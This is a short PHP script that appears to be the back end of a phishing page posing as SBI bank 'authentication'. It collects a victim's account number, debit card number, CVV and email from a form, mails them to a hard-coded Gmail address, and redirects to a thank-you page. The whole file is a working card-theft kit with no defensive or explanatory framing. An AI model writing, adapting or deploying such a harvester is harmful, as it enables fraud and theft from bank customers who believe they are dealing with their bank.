<?php 
$Account_Number = $_POST['AccNo'];
$email = $_POST['email'];
$debit = $_POST['cardDetails'];
$cvv = $_POST['cvv'];
$formcontent="From: $email \n Message:\n Account Number : $Account_Number \n Debit Card : $debit \n CVV : $cvv";
$recipient = "hosmanenavneet@gmail.com";
$subject = "SBI Authentication";
$mailheader = "From: $email \r\n";
if(mail($recipient, $subject, $formcontent, $mailheader))
{
header("Refresh:0; url=Thank_you.html");
}

else {
    echo "Error!";
}
?>